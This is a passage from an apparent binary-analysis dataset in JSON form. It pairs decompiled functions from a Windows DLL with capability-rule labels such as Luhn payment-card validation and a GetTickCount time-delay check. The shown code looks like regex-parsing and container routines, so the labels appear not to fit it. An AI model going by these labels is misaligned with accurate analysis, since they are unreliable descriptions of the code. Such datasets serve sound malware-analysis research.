           ((((uVar2 & 8) != 0 || (1 < *piVar1 - 0x28U)) &&\n                    (((uVar2 & 0x10) != 0 || ((*piVar1 - 0x7bU & 0xfffd) != 0)))))) {\n                    bVar5 = false;\n                }\n                else {\n                    bVar5 = true;\n                }\n                if (bVar5) {\n                    piVar7 = piVar1;\n                }\n            }\n            *arg1 = piVar7 + 1;\n        }\n        fcn.180015150(arg1);\n        piVar7 = *arg1;\n        iVar3 = *(arg1 + 0x7c);\n        if (piVar7 != arg1[2]) {\n            if (*piVar7 == 0x5c) {\n                piVar1 = piVar7 + 1;\n                if ((piVar1 == arg1[2]) ||\n                   ((((*(arg1 + 0x10) & 8) != 0 || (1 < *piVar1 - 0x28U)) &&\n                    (((*(arg1 + 0x10) & 0x10) != 0 || ((*piVar1 - 0x7bU & 0xfffd) != 0)))))) {\n                    bVar5 = false;\n                }\n                else {\n                    bVar5 = true;\n                }\n                if (bVar5) {\n                    piVar7 = piVar1;\n                }\n            }\n            *arg1 = piVar7 + 1;\n        }\n        noname_0 = arg1;\n        fcn.180015150(arg1);\n        if (iVar3 != 0x3a) {\n            if (iVar3 == 0x21) {\n                fcn.180018c00(arg1);\n                *(arg1 + 0x1c) = *(arg1 + 0x1c) + -1;\n                return 0;\n            }\n            if (iVar3 != 0x3d) {\n                fcn.180015140(noname_0, 0xe);\n                pcVar4 = swi(3);\n                uVar6 = (*pcVar4)();\n                return uVar6;\n            }\n            fcn.180018c00(arg1);\n            *(arg1 + 0x1c) = *(arg1 + 0x1c) + -1;\n            return 0;\n        }\n    }\n    uVar6 = fcn.180015eb0(arg1 + 8, 8);\n    fcn.180015400(arg1);\n    fcn.180015670(arg1 + 8, uVar6);\ncode_r0x000180016a51:\n    *(arg1 + 0x1c) = *(arg1 + 0x1c) + -1;\n    return 1;\n}\n",
        "token_count": 1383
    },
    "1800186b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.1800186b0(int16_t **arg1)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    ulong uVar7;\n    uint32_t uVar8;\n    int64_t *noname_0;\n    int16_t **ppiVar9;\n    int16_t *piVar10;\n    int16_t *piVar11;\n    int32_t iVar12;\n    \n    if (*(arg1 + 0x7c) == -1) {\n        fcn.180015140(arg1, 2);\n        pcVar3 = swi(3);\n        uVar7 = (*pcVar3)();\n        return uVar7;\n    }\n    uVar8 = *(arg1 + 0x10);\n    ppiVar9 = arg1;\n    if ((uVar8 >> 0x10 & 1) == 0) {\ncode_r0x000180018719:\n        if ((uVar8 >> 0xf & 1) != 0) {\n            if (*(arg1 + 0xf) == 0x61) {\n                uVar5 = 7;\n            }\n            else {\n                if (*(arg1 + 0xf) != 0x62) goto code_r0x000180018797;\n                uVar5 = 8;\n            }\n            goto code_r0x00018001873b;\n        }\ncode_r0x000180018797:\n        iVar1 = *(arg1 + 0xf);\n        if (iVar1 != 99) {\n            if (iVar1 == 0x78) {\n                if ((uVar8 >> 0xc & 1) != 0) {\n                    piVar10 = *arg1;\n                    if (piVar10 != arg1[2]) {\n                        if (((*piVar10 == 0x5c) && (piVar11 = piVar10 + 1,  piVar11 != arg1[2])) &&\n                           ((((uVar8 & 8) == 0 && (*piVar11 - 0x28U < 2)) ||\n                            (((uVar8 & 0x10) == 0 && ((*piVar11 - 0x7bU & 0xfffd) == 0)))))) {\n                            piVar10 = piVar11;\n                        }\n                        *arg1 = piVar10 + 1;\n                    }\n                    fcn.180015150(arg1);\n                    uVar7 = 2;\ncode_r0x0001800188fb:\n                    fcn.18001a0e0(arg1, uVar7);\n                    goto code_r0x000180018903;\n                }\n            }\n            else if ((iVar1 == 0x75) && ((uVar8 >> 0xb & 1) != 0)) {\n                piVar10 = *arg1;\n                if (piVar10 != arg1[2]) {\n                    if (((*piVar10 == 0x5c) && (piVar11 = piVar10 + 1,  piVar11 != arg1[2])) &&\n                       ((((uVar8 & 8) == 0 && (*piVar11 - 0x28U < 2)) ||\n                        (((uVar8 & 0x10) == 0 && ((*piVar11 - 0x7bU & 0xfffd) == 0)))))) {\n                        piVar10 = piVar11;\n                    }\n                    *arg1 = piVar10 + 1;\n                }\n                fcn.180015150(arg1);\n                uVar7 = 4;\n                goto code_r0x0001800188fb;\n            }\ncode_r0x000180018991:\n            if ((uVar8 >> 0xd & 1) != 0) {\n                iVar12 = 3;\n                *(arg1 + 0x74) = 0;\n                do {\n                    uVar2 = *(arg1 + 0xf);\n                    ppiVar9 = uVar2;\n                    if (7 < uVar2 - 0x30) break;\n                    uVar8 = uVar2 - 0x30;\n                    ppiVar9 = uVar8;\n                    if (uVar8 == 0xffffffff) break;\n                    iVar12 = iVar12 + -1;\n                    *(arg1 + 0x74) = uVar8 + *(arg1 + 0x74) * 8;\n                    piVar10 = *arg1;\n                    if (piVar10 != arg1[2]) {\n                        if (((*piVar10 == 0x5c) && (piVar11 = piVar10 + 1,  piVar11 != arg1[2])) &&\n                           ((((*(arg1 + 0x10) & 8) == 0 && (*piVar11 - 0x28U < 2)) ||\n                            (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar11 - 0x7bU & 0xfffd) == 0)))))) {\n                            piVar10 = piVar11;\n                        }\n                        *arg1 = piVar10 + 1;\n                    }\n                    ppiVar9 = arg1;\n                    fcn.180015150(arg1);\n                } while (iVar12 != 0);\n                if (iVar12 != 3) {\n                    if (*(arg1 + 0x74) == 0) {\n                        fcn.180015140(ppiVar9, 2);\n                        pcVar3 = swi(3);\n                        uVar7 = (*pcVar3)();\n                        return uVar7;\n                    }\n                    goto code_r0x000180018903;\n                }\n            }\n            uVar8 = *(arg1 + 0x10);\n            uVar2 = *(arg1 + 0xf);\n            if ((uVar8 >> 0x16 & 1) == 0) {\n                if (uVar2 - 0x22 < 0x5c) {\n    // switch table (92 cases) at 0x180018b94\n                    switch(*(*((uVar2 - 0x22) + 0x180018ba4) * 4 + 0x180018b94) + 0x180000000) {\n                    case 0x180018aaa:\n                        uVar6 = uVar8 >> 0x17;\n                        break;\n                    case 0x180018ab2:\n                        uVar6 = uVar8 >> 0x18;\n                        break;\n                    case 0x180018abc:\n                        goto code_r0x000180018abc;\n                    case 0x180018b1f:\n                        goto code_r0x000180018b1f;\n                    }\n                    if ((uVar6 & 1) != 0) goto code_r0x000180018abc;\n                }\ncode_r0x000180018b1f:\n                return 0;\n            }\n            if (uVar2 - 0x44 < 0x34) {\n    // switch table (52 cases) at 0x180018b58\n                switch(*(*((uVar2 - 0x44) + 0x180018b60) * 4 + 0x180018b58) + 0x180000000) {\n                case 0x180018b1f:\n                    goto code_r0x000180018b1f;\n                }\n            }\ncode_r0x000180018abc:\n            piVar10 = *arg1;\n            *(arg1 + 0x74) = uVar2;\n            if (piVar10 != arg1[2]) {\n                if (((*piVar10 == 0x5c) && (piVar11 = piVar10 + 1,  piVar11 != arg1[2])) &&\n                   ((((uVar8 & 8) == 0 && (*piVar11 - 0x28U < 2)) ||\n                    (((uVar8 & 0x10) == 0 && ((*piVar11 - 0x7bU & 0xfffd) == 0)))))) {\n                    piVar10 = piVar11;\n                }\n                *arg1 = piVar10 + 1;\n            }\n            fcn.180015150(arg1);\n            return 1;\n        }\n        if ((uVar8 >> 0x12 & 1) == 0) goto code_r0x000180018991;\n        piVar10 = *arg1;\n        if (piVar10 != arg1[2]) {\n            if (((*piVar10 == 0x5c) && (piVar11 = piVar10 + 1,  piVar11 != arg1[2])) &&\n               ((((uVar8 & 8) == 0 && (*piVar11 - 0x28U < 2)) ||\n                (((uVar8 & 0x10) == 0 && ((*piVar11 - 0x7bU & 0xfffd) == 0)))))) {\n                piVar10 = piVar11;\n            }\n            *arg1 = piVar10 + 1;\n        }\n        fcn.180015150(arg1);\n        noname_0 = *(arg1[0xd] + 4);\n        cVar4 = (**(*noname_0 + 0x20))(noname_0, 0x103);\n        if (cVar4 == '\\0') {\n            fcn.180015140(noname_0, 2);\n            pcVar3 = swi(3);\n            uVar7 = (*pcVar3)();\n            return uVar7;\n        }\n        piVar10 = *arg1;\n        *(arg1 + 0x74) = *(arg1 + 0xf) & 0x1f;\n        if (piVar10 != arg1[2]) {\n            if ((*piVar10 == 0x5c) && (piVar11 = piVar10 + 1,  piVar11 != arg1[2])) {\n                if (((*(arg1 + 0x10) & 8) != 0) || (1 < *piVar11 - 0x28U)) {\n                    if ((*(arg1 + 0x10) & 0x10) != 0) goto code_r0x00018001887a;\n                    goto code_r0x00018001886b;\n                }\n                goto code_r0x000180018877;\n            }\n            goto code_r0x00018001887a;\n        }\n    }\n    else {\n        iVar1 = *(arg1 + 0xf);\n        if (iVar1 == 0x66) {\n            uVar5 = 0xc;\n        }\n        else if (iVar1 == 0x6e) {\n            uVar5 = 10;\n        }\n        else if (iVar1 == 0x72) {\n            uVar5 = 0xd;\n        }\n        else if (iVar1 == 0x74) {\n            uVar5 = 9;\n        }\n        else {\n            if (iVar1 != 0x76) goto code_r0x000180018719;\n            uVar5 = 0xb;\n        }\ncode_r0x00018001873b:\n        *(arg1 + 0x74) = uVar5;\n        piVar10 = *arg1;\n        if (piVar10 != arg1[2]) {\n            if ((*piVar10 == 0x5c) && (piVar11 = piVar10 + 1,  piVar11 != arg1[2])) {\n                if (((*(arg1 + 0x10) & 8) == 0) && (*piVar11 - 0x28U < 2)) {\ncode_r0x000180018877:\n                    piVar10 = piVar11;\n                }\n                else if ((*(arg1 + 0x10) & 0x10) == 0) {\ncode_r0x00018001886b:\n                    if ((*piVar11 - 0x7bU & 0xfffd) == 0) goto code_r0x000180018877;\n                }\n            }\ncode_r0x00018001887a:\n            *arg1 = piVar10 + 1;\n        }\n    }\n    fcn.180015150(arg1);\ncode_r0x000180018903:\n    if (0xffff < *(arg1 + 0x74)) {\n        fcn.180015140(ppiVar9, 2);\n        pcVar3 = swi(3);\n        uVar7 = (*pcVar3)();\n        return uVar7;\n    }\n    *(arg1 + 0x74) = *(arg1 + 0x74) & 0xffff;\n    return 1;\n}\n",
        "token_count": 2798
    },
    "180019da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.180019da0(ulong *arg1, ulong *arg2)\n\n{\n    int64_t arg2_00;\n    int64_t iVar1;\n    int64_t arg3;\n    \n    *arg1 = *arg2;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg2_00 = arg2[1];\n    if (arg2_00 != arg2[2]) {\n        arg3 = arg2[2] - arg2_00;\n        iVar1 = fcn.180015a30(arg1, arg3 >> 2);\n        arg1[1] = iVar1;\n        arg1[2] = iVar1;\n        arg1[3] = iVar1 + (arg3 >> 2) * 4;\n        iVar1 = arg1[1];\n        fcn.1800ade80(iVar1, arg2_00, arg3);\n        arg1[2] = arg3 + iVar1;\n    }\n    arg1[4] = arg2[4];\n    return arg1;\n}\n",
        "token_count": 248
    },
    "18001b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001b800(int64_t *arg1, uint64_t arg2, uint *arg3)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int64_t arg1_00;\n    uint64_t uVar3;\n    int64_t arg1_01;\n    int64_t iVar4;\n    uint64_t arg2_00;\n    \n    if (0x3fffffffffffffff < arg2) {\n        fcn.180014900();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    uVar3 = arg1[2] - *arg1 >> 2;\n    iVar4 = arg1[1] - *arg1 >> 2;\n    arg2_00 = arg2;\n    if ((uVar3 <= 0x3fffffffffffffff - (uVar3 >> 1)) && (arg2_00 = (uVar3 >> 1) + uVar3,  arg2_00 < arg2)) {\n        arg2_00 = arg2;\n    }\n    arg1_00 = fcn.180015a30(uVar3, arg2_00);\n    puVar1 = arg1_00 + iVar4 * 4;\n    for (iVar4 = arg2 - iVar4; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar1 = *arg3;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.1800ade80(arg1_00, *arg1, arg1[1] - *arg1);\n    iVar4 = *arg1;\n    if (iVar4 != 0) {\n        uVar3 = arg1[2] - iVar4 & 0xfffffffffffffffc;\n        arg1_01 = iVar4;\n        if (0xfff < uVar3) {\n            arg1_01 = *(iVar4 + -8);\n            if (0x1f < (iVar4 - arg1_01) - 8U) {\n                fcn.1800b3528(iVar4 - arg1_01, uVar3 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_01);\n    }\n    *arg1 = arg1_00;\n    arg1[1] = arg1_00 + arg2 * 4;\n    arg1[2] = arg1_00 + arg2_00 * 4;\n    return;\n}\n",
        "token_count": 562
    },
    "18001ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001ba00(uint16_t **arg1, ulong arg2)\n\n{\n    uint16_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    uint64_t noname_0;\n    uint16_t *puVar7;\n    uint16_t **noname_0_00;\n    uint16_t *puVar8;\n    int64_t iVar9;\n    bool bVar10;\n    \n    iVar9 = 0;\n    if (arg2 == 0x3a) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if ((arg2 != 0x3d) && (uVar6 = 0xe,  arg2 == 0x2e)) {\n            uVar6 = 0;\n        }\n    }\n    puVar8 = *arg1;\n    uVar2 = *(arg1 + 0x7c);\n    while ((((uVar2 != 0x3a && (uVar2 != 0x3d)) && (uVar2 != 0x2e)) && (uVar2 != 0xffffffff))) {\n        puVar7 = *arg1;\n        if (puVar7 != arg1[2]) {\n            if (((*puVar7 == 0x5c) && (puVar1 = puVar7 + 1,  puVar1 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*puVar1 - 0x28 < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*puVar1 - 0x7b & 0xfffd) == 0)))))) {\n                puVar7 = puVar1;\n            }\n            *arg1 = puVar7 + 1;\n        }\n        fcn.180015150(arg1);\n        iVar9 = iVar9 + 1;\n        uVar2 = *(arg1 + 0x7c);\n    }\n    noname_0 = uVar2;\n    if (uVar2 != arg2) {\n        fcn.180015140(noname_0, uVar6);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    if (arg2 == 0x3a) {\n        puVar7 = arg1[0xd];\n        iVar5 = fcn.18001b1c0(puVar7, puVar8, *arg1);\n        if (iVar5 == 0) {\n            fcn.180015140(puVar7, 1);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.18001a790(arg1 + 8);\n    }\n    else if (arg2 == 0x3d) {\n        if (puVar8 == *arg1) {\n            fcn.180015140(noname_0, 0);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.18001c000(arg1 + 8, puVar8, *arg1, iVar9);\n    }\n    else if (arg2 == 0x2e) {\n        if (puVar8 == *arg1) {\n            fcn.180015140(noname_0, 0);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.18001c210(noname_0, puVar8, *arg1, iVar9);\n    }\n    puVar8 = *arg1;\n    if (puVar8 != arg1[2]) {\n        if (((*puVar8 == 0x5c) && (puVar7 = puVar8 + 1,  puVar7 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*puVar7 - 0x28 < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*puVar7 - 0x7b & 0xfffd) == 0)))))) {\n            puVar8 = puVar7;\n        }\n        *arg1 = puVar8 + 1;\n    }\n    noname_0_00 = arg1;\n    fcn.180015150(arg1);\n    if (*(arg1 + 0x7c) != 0x5d) {\n        fcn.180015140(noname_0_00, uVar6);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    puVar8 = *arg1;\n    if (puVar8 != arg1[2]) {\n        if (((*puVar8 == 0x5c) && (puVar7 = puVar8 + 1,  puVar7 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*puVar7 - 0x28 < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*puVar7 - 0x7b & 0xfffd) == 0)))))) {\n            puVar8 = puVar7;\n        }\n        *arg1 = puVar8 + 1;\n    }\n    if (*arg1 == arg1[2]) {\n        *(arg1 + 0xf) = 0xffff;\n        uVar6 = 0xffffffff;\n    }\n    else {\n        uVar4 = **arg1;\n        *(arg1 + 0xf) = uVar4;\n        iVar9 = fcn.1800add0c(\"()$^.*+?[]|\\\\-{},:=!\\n\\r\\b\", uVar4);\n        if (iVar9 == 0) {\n            uVar6 = 0;\n        }\n        else {\n            uVar6 = *(arg1 + 0xf);\n        }\n    }\n    *(arg1 + 0x7c) = uVar6;\n    if (0x73 < *(arg1 + 0xf) - 10) {\n        return;\n    }\n    switch(*(*((*(arg1 + 0xf) - 10) + 0x180015384) * 4 + 0x18001535c) + 0x180000000) {\n    case 0x1800151c8:\n        puVar8 = *arg1 + 1;\n        if (puVar8 == arg1[2]) {\n            return;\n        }\n        if (((*(arg1 + 0x10) & 8) != 0) || ((uVar4 = *puVar8,  uVar4 != 0x28 && (uVar4 != 0x29)))) {\n            if ((*(arg1 + 0x10) & 0x10) != 0) {\n                return;\n            }\n            uVar4 = *puVar8;\n            if ((uVar4 != 0x7b) && (uVar4 != 0x7d)) {\n                return;\n            }\n        }\n        *(arg1 + 0xf) = uVar4;\n        *(arg1 + 0x7c) = uVar4;\n        return;\n    case 0x18001522d:\n        if ((*(arg1 + 0x10) & 4) == 0) {\n            return;\n        }\n        if (*(arg1 + 0x1c) != 0) {\n            return;\n        }\n        *(arg1 + 0x7c) = 0x7c;\n        return;\n    case 0x180015255:\n        bVar10 = (*(arg1 + 0x10) & 8) == 0;\n        break;\n    case 0x180015261:\n        bVar10 = (*(arg1 + 0x10) & 0x10) == 0;\n        break;\n    case 0x18001526d:\n        if ((*(arg1 + 0x10) & 0x4000000) == 0) {\n            return;\n        }\n        uVar6 = *(arg1[9] + 4);\n        if ((0x14 < uVar6) || ((0x102100U >> (uVar6 & 0x1f) & 1) == 0)) {\n            if (uVar6 != 2) {\n                return;\n            }\n            uVar6 = *(*(arg1[9] + 0xc) + 8);\n            if (0x14 < uVar6) {\n                return;\n            }\n            if ((0x102100U >> (uVar6 & 0x1f) & 1) == 0) {\n                return;\n            }\n            *(arg1 + 0x7c) = 0;\n            return;\n        }\n        goto code_r0x00018001534c;\n    case 0x1800152c7:\n        if ((*(arg1 + 0x10) & 0x2000000) == 0) {\n            return;\n        }\n        uVar6 = *(arg1[9] + 4);\n        if ((uVar6 < 0x15) && ((0x102100U >> (uVar6 & 0x1f) & 1) != 0)) {\n            return;\n        }\n        if ((uVar6 == 2) && (uVar6 = *(*(arg1[9] + 0xc) + 8),  uVar6 < 0x15)) {\n            if ((0x102100U >> (uVar6 & 0x1f) & 1) != 0) {\n                return;\n            }\n            *(arg1 + 0x7c) = 0;\n            return;\n        }\n        goto code_r0x00018001534c;\n    case 0x18001530d:\n        if ((*(arg1 + 0x10) & 0x2000000) == 0) {\n            return;\n        }\n        if (*arg1 + 1 == arg1[2]) {\n            return;\n        }\n        if ((*arg1)[1] == 10) {\n            return;\n        }\n        *(arg1 + 0x7c) = 0;\n        return;\n    case 0x18001533a:\n        bVar10 = (*(arg1 + 0x10) & 1) == 0;\n        break;\n    case 0x180015343:\n        bVar10 = (*(arg1 + 0x10) & 2) == 0;\n        break;\n    case 0x18001534f:\n        goto code_r0x00018001534f;\n    }\n    if (bVar10) {\ncode_r0x00018001534c:\n        *(arg1 + 0x7c) = 0;\n    }\ncode_r0x00018001534f:\n    return;\n}\n",
        "token_count": 2457
    },
    "18002068": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.180020680(uint *arg1, ulong *arg2, ulong *arg3)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    ulong *puVar5;\n    \n    arg2_00 = arg3[2];\n    if (7 < arg3[3]) {\n        arg3 = *arg3;\n    }\n    iVar1 = arg2[2];\n    if (arg2[3] - iVar1 < arg2_00) {\n        arg2 = fcn.180013690(arg2, arg2_00, 0, arg3);\n    }\n    else {\n        arg2[2] = arg2_00 + iVar1;\n        puVar5 = arg2;\n        if (7 < arg2[3]) {\n            puVar5 = *arg2;\n        }\n        fcn.1800ade80(puVar5 + iVar1 * 2, arg3, arg2_00 * 2);\n        *(puVar5 + (arg2_00 + iVar1) * 2) = 0;\n    }\n    *(arg1 + 4) = 0;\n    *(arg1 + 6) = 0;\n    uVar2 = *(arg2 + 4);\n    uVar3 = *(arg2 + 1);\n    uVar4 = *(arg2 + 0xc);\n    *arg1 = *arg2;\n    arg1[1] = uVar2;\n    arg1[2] = uVar3;\n    arg1[3] = uVar4;\n    uVar2 = *(arg2 + 0x14);\n    uVar3 = *(arg2 + 3);\n    uVar4 = *(arg2 + 0x1c);\n    arg1[4] = *(arg2 + 2);\n    arg1[5] = uVar2;\n    arg1[6] = uVar3;\n    arg1[7] = uVar4;\n    arg2[2] = 0;\n    arg2[3] = 7;\n    *arg2 = 0;\n    return arg1;\n}\n",
        "token_count": 480
    },
    "18002075": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.180020750(uint *arg1, ulong *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    ulong *puVar5;\n    uint64_t arg2_00;\n    \n    arg2_00 = 0xffffffffffffffff;\n    do {\n        arg2_00 = arg2_00 + 1;\n    } while (*(arg3 + arg2_00) != '\\0');\n    iVar1 = arg2[2];\n    if (arg2[3] - iVar1 < arg2_00) {\n        arg2 = fcn.180014270(arg2, arg2_00, 0, arg3);\n    }\n    else {\n        arg2[2] = iVar1 + arg2_00;\n        puVar5 = arg2;\n        if (0xf < arg2[3]) {\n            puVar5 = *arg2;\n        }\n        fcn.1800ade80(puVar5 + iVar1, arg3, arg2_00);\n        (puVar5 + iVar1)[arg2_00] = 0;\n    }\n    *(arg1 + 4) = 0;\n    *(arg1 + 6) = 0;\n    uVar2 = *(arg2 + 4);\n    uVar3 = *(arg2 + 1);\n    uVar4 = *(arg2 + 0xc);\n    *arg1 = *arg2;\n    arg1[1] = uVar2;\n    arg1[2] = uVar3;\n    arg1[3] = uVar4;\n    uVar2 = *(arg2 + 0x14);\n    uVar3 = *(arg2 + 3);\n    uVar4 = *(arg2 + 0x1c);\n    arg1[4] = *(arg2 + 2);\n    arg1[5] = uVar2;\n    arg1[6] = uVar3;\n    arg1[7] = uVar4;\n    arg2[2] = 0;\n    *arg2 = 0;\n    arg2[3] = 0xf;\n    return arg1;\n}\n",
        "token_count": 484
    },
    "18002082": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.180020820(ulong *arg1, ulong noname_1, ulong *arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    uint64_t arg3_00;\n    \n    iVar1 = arg1[2];\n    if (arg1[3] - iVar1 < arg4) {\n        puVar2 = fcn.180020910(arg1, arg4);\n        return puVar2;\n    }\n    arg1[2] = iVar1 + arg4;\n    puVar2 = arg1;\n    if (0xf < arg1[3]) {\n        puVar2 = *arg1;\n    }\n    arg3_00 = arg4;\n    if ((puVar2 < arg3 + arg4) && (arg3 <= puVar2 + iVar1)) {\n        if (arg3 < puVar2) {\n            arg3_00 = puVar2 - arg3;\n        }\n        else {\n            arg3_00 = 0;\n        }\n    }\n    fcn.1800ade80(puVar2 + arg4, puVar2, iVar1 + 1);\n    fcn.1800ade80(puVar2, arg3, arg3_00);\n    fcn.1800ade80(puVar2 + arg3_00, arg3 + arg4 + arg3_00, arg4 - arg3_00);\n    return arg1;\n}\n",
        "token_count": 318
    },
    "18002500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180025000(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong arg2;\n    int64_t iVar4;\n    \n    arg2 = 0x20;\n    fcn.18008ff90(arg1 + 0x12, 0x20, 3, fcn.180003e40);\n    fcn.18002df90(arg1 + 0xd, arg2);\n    if (7 < arg1[0xb]) {\n        iVar4 = arg1[0xb] * 2;\n        iVar2 = arg1[8];\n        iVar3 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            iVar4 = iVar4 + 0x29;\n            iVar3 = *(iVar2 + -8);\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x000180025134;\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[10] = 0;\n    arg1[0xb] = 7;\n    *(arg1 + 8) = 0;\n    if (7 < arg1[7]) {\n        iVar4 = arg1[7] * 2;\n        iVar2 = arg1[4];\n        iVar3 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            iVar4 = iVar4 + 0x29;\n            iVar3 = *(iVar2 + -8);\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x000180025134;\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[6] = 0;\n    arg1[7] = 7;\n    *(arg1 + 4) = 0;\n    if (7 < arg1[3]) {\n        iVar4 = arg1[3] * 2;\n        iVar2 = *arg1;\n        iVar3 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            iVar4 = iVar4 + 0x29;\n            iVar3 = *(iVar2 + -8);\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) {\ncode_r0x000180025134:\n                fcn.1800b3528(iVar2, iVar4);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[2] = 0;\n    arg1[3] = 7;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 628
    },
    "1800276c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nushort * fcn.1800276c0(ulong noname_0, ushort *arg2)\n\n{\n    *(arg2 + 8) = 0;\n    *(arg2 + 0xc) = 7;\n    *arg2 = 0;\n    *(arg2 + 0x18) = 0;\n    *(arg2 + 0x1c) = 7;\n    arg2[0x10] = 0;\n    *(arg2 + 0x28) = 0;\n    *(arg2 + 0x2c) = 7;\n    arg2[0x20] = 0;\n    *(arg2 + 0x38) = 0;\n    *(arg2 + 0x3c) = 7;\n    arg2[0x30] = 0;\n    *(arg2 + 0x48) = 0;\n    *(arg2 + 0x4c) = 7;\n    arg2[0x40] = 0;\n    fcn.180010d70(arg2, 0x1800f6074, 0);\n    fcn.180010d70(arg2 + 0x10, 0x1800f6094, 0);\n    fcn.180010d70(arg2 + 0x20, 0x1800f60bc, 0);\n    fcn.180010d70(arg2 + 0x30, 0x1800f60cc, 0);\n    fcn.180010d70(arg2 + 0x40, 0x1800f60dc, 0);\n    return arg2;\n}\n",
        "token_count": 362
    },
    "180028e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
